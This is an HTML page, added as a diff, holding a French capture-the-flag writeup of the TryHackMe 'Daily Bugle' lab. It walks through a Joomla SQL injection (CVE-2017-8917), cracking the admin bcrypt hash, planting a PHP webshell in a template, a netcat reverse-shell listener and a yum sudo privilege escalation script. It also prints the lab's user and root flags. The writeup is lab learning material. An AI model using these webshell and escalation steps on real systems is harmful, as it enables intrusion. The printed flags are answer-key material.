@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Daily Bugle — TryHackMe Writeup | Alex171</title>
+    <meta name="description"
+        content="Writeup Daily Bugle TryHackMe — Joomla SQLi CVE-2017-8917, crack bcrypt, escalade yum." />
+    <link rel="stylesheet" href="../css/style.css" />
+    <link rel="stylesheet" href="../css/animations.css" />
+    <link rel="icon"
+        href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>" />
+</head>
+
+<body>
+    <canvas id="matrix-canvas"></canvas>
+    <div class="grid-bg"></div>
+    <nav class="navbar">
+        <a class="nav-logo" href="../index.html">&gt;_<span> alex171</span></a>
+        <div class="nav-links">
+            <a href="../index.html">Accueil</a><a href="../about.html">À propos</a>
+            <a href="../writeups.html" class="active">Writeups</a><a href="../certifications.html">Certifications</a>
+            <a href="../projects.html">Projets</a><a href="../resources.html">Ressources</a>
+        </div>
+        <div class="hamburger" id="hamburger"><span></span><span></span><span></span></div>
+    </nav>
+    <div class="mobile-menu" id="mobile-menu">
+        <a href="../index.html">Accueil</a><a href="../writeups.html">Writeups</a>
+        <a href="../certifications.html">Certifications</a><a href="../resources.html">Ressources</a>
+    </div>
+
+    <main>
+        <section class="section">
+            <div class="container">
+                <div style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-muted);margin-bottom:1.5rem;"
+                    class="fade-in">
+                    <a href="../index.html" style="color:var(--text-muted);">~</a> / <a href="../writeups.html"
+                        style="color:var(--text-muted);">writeups</a> / <span
+                        style="color:var(--green);">daily-bugle</span>
+                </div>
+                <div class="writeup-layout">
+                    <article class="writeup-content fade-in">
+                        <div style="margin-bottom:2rem;">
+                            <div
+                                style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.75rem;flex-wrap:wrap;">
+                                <span class="writeup-platform">TryHackMe</span><span class="diff diff-hard">Hard</span>
+                                <span style="font-family:var(--font-mono);font-size:0.72rem;color:var(--text-muted);">28
+                                    Fév 2026</span>
+                            </div>
+                            <h1 style="font-size:2rem;font-weight:800;color:var(--text-primary);margin-bottom:0.75rem;">
+                                Daily Bugle</h1>
+                            <div class="writeup-meta">
+                                <span class="tag">Joomla</span><span class="tag red">CVE-2017-8917</span>
+                                <span class="tag">SQLi</span><span class="tag">bcrypt</span><span
+                                    class="tag">John</span><span class="tag">yum</span>
+                            </div>
+                            <p style="color:var(--text-secondary);line-height:1.8;font-size:0.95rem;">
+                                Joomla 3.7.0 vulnérable à une SQLi (CVE-2017-8917). Dump du hash bcrypt admin, crack
+                                avec John.
+                                Escalade de privilèges via <code>sudo yum</code>.
+                            </p>
+                        </div>
+
+                        <h2 id="recon">Reconnaissance</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">nmap</span> -sC -sV lab.thm
+<span class="hl-bash">curl</span> http://lab.thm/README.txt   <span class="hl-comment"># → Joomla 3.7.0</span></pre>
+                        </div>
+
+                        <h2 id="sqli">SQLi — CVE-2017-8917</h2>
+                        <p>Le composant <code>com_fields</code> de Joomla 3.7.0 est vulnérable à une SQLi union-based.
+                            On utilise un exploit Python public :</p>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">python3</span> 42033.py -u http://lab.thm</pre>
+                        </div>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>output</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-out">Username : jonah
+Hash     : $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm</span></pre>
+                        </div>
+
+                        <h2 id="crack">Crack bcrypt avec John</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">john</span> --format=bcrypt \
+  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</pre>
+                        </div>
+                        <div class="flag-box">Mot de passe Joomla admin : <strong>spiderman123</strong></div>
+
+                        <h2 id="webshell">Webshell via Joomla Templates</h2>
+                        <p>Connecté côté admin Joomla (<code>/administrator</code>), on injecte un webshell PHP dans un
+                            template :</p>
+                        <ol>
+                            <li>Extensions → Templates → Protostar → Templates</li>
+                            <li>Éditer <code>index.php</code>, ajouter <code>&lt;?php system($_GET['cmd']); ?&gt;</code>
+                            </li>
+                            <li>Accéder à <code>http://lab.thm/?cmd=id</code></li>
+                        </ol>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>Reverse Shell</span><button
+                                    class="copy-btn">Copier</button></div>
+                            <pre><span class="hl-bash">nc</span> -lvnp 9001
+<span class="hl-comment"># URL-encode le payload bash rev shell dans ?cmd=</span></pre>
+                        </div>
+
+                        <h2 id="flags">Flags</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">cat</span> /home/jjameson/user.txt</pre>
+                        </div>
+                        <div class="flag-box">User flag : <code>27a260fe3cba712cfdedb1c86d80442e</code></div>
+
+                        <h2 id="privesc">Escalade de privilèges — yum</h2>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
+                            </div>
+                            <pre><span class="hl-bash">sudo</span> -l
+<span class="hl-out">(root) NOPASSWD: /usr/bin/yum</span></pre>
+                        </div>
+                        <p>Via GTFOBins — yum permet d'exécuter des commandes via un plugin :</p>
+                        <div class="code-block">
+                            <div class="code-block-header"><span>bash — GTFOBins yum</span><button
+                                    class="copy-btn">Copier</button></div>
+                            <pre>TF=$(mktemp -d)
+cat &gt;$TF/x.conf &lt;&lt;EOF
+[main]
+plugins=1
+pluginpath=$TF
+pluginconfpath=$TF
+EOF
+cat &gt;$TF/y.conf &lt;&lt;EOF
+[main]
+enabled=1
+EOF
+cat &gt;$TF/y.py &lt;&lt;EOF
+import os
+import yum
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+requires_api_version='2.1'
+def init_hook(conduit):
+  os.execl('/bin/sh','/bin/sh')
+EOF
+<span class="hl-bash">sudo</span> yum -c $TF/x.conf --enableplugin=y</pre>
+                        </div>
+                        <div class="flag-box">Root flag : <code>eec3d53292b1821868266858d7fa6f79</code></div>
+
+                        <h2 id="lessons">Leçons apprises</h2>
+                        <ul>
+                            <li>Toujours mettre à jour le CMS — Joomla 3.7.0 est vulnérable à SQLi triviale</li>
+                            <li>L'accès admin Joomla = webshell garanti via édition de templates</li>
+                            <li>GTFOBins est une référence incontournable pour les privesc sudo</li>
+                            <li>bcrypt ralentit le bruteforce mais rockyou reste efficace sur mots faibles</li>
+                        </ul>
+
+                        <div
+                            style="margin-top:2rem;padding-top:1.5rem;border-top:1px solid var(--border);display:flex;gap:1rem;flex-wrap:wrap;">
+                            <a href="../writeups.html" class="btn btn-outline">← Tous les writeups</a>
+                            <a href="bookstore.html" class="btn btn-outline">Suivant : Bookstore →</a>
+                        </div>
+                    </article>
+
+                    <aside class="writeup-sidebar">
+                        <div class="sidebar-title">Table des matières</div>
+                        <div class="toc-list">
+                            <div class="toc-item" data-target="recon">Reconnaissance</div>
+                            <div class="toc-item" data-target="sqli">SQLi — CVE-2017-8917</div>
+                            <div class="toc-item" data-target="crack">Crack bcrypt</div>
+                            <div class="toc-item" data-target="webshell">Webshell Joomla</div>
+                            <div class="toc-item" data-target="flags">Flags</div>
+                            <div class="toc-item" data-target="privesc">Privesc — yum</div>
+                            <div class="toc-item" data-target="lessons">Leçons apprises</div>
+                        </div>
+                        <hr style="border-color:var(--border);margin:1rem 0;" />
+                        <div
+                            style="display:flex;flex-direction:column;gap:0.4rem;font-size:0.78rem;font-family:var(--font-mono);">
+                            <div><span style="color:var(--text-muted);">Plateforme :</span> <span
+                                    style="color:var(--green);">TryHackMe</span></div>
+                            <div><span style="color:var(--text-muted);">Difficulté :</span> <span
+                                    style="color:var(--red);">Hard</span></div>
+                            <div><span style="color:var(--text-muted);">CVE :</span> <span
+                                    style="color:var(--red);">CVE-2017-8917</span></div>
+                            <div><span style="color:var(--text-muted);">Date :</span> <span
+                                    style="color:var(--text-secondary);">28 Fév 2026</span></div>
+                        </div>
+                    </aside>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-inner">
+                <div class="footer-name">&gt;_ alex171-studo</div>
+                <div class="footer-links"><a href="../writeups.html">Writeups</a><a href="../index.html">Accueil</a>
+                </div>
+                <div class="footer-copy">© 2026 Alex171-studo</div>
+            </div>
+        </div>
+    </footer>
+
+    <div id="interactive-terminal" class="terminal-window">
+        <div class="terminal-titlebar">
+            <div class="terminal-dot dot-red"></div>
+            <div class="terminal-dot dot-yellow"></div>
+            <div class="terminal-dot dot-green"></div>
+            <span class="terminal-title">Terminal interactif</span>
+            <button id="term-close"
+                style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">✕</button>
+        </div>
+        <div class="term-interactive-body" id="term-output"></div>
+        <div class="term-input-line">
+            <span class="t-prompt" style="white-space:nowrap;font-size:0.8rem;">alex@portfolio:~$</span>
+            <input type="text" id="term-input" class="term-input" placeholder="help" autocomplete="off"
+                spellcheck="false" />
+        </div>
+    </div>
+    <button class="term-toggle-btn" id="term-toggle">&gt;_</button>
+    <script src="../js/main.js"></script>
+    <script src="../js/terminal.js"></script>
+</body>
+
+</html>
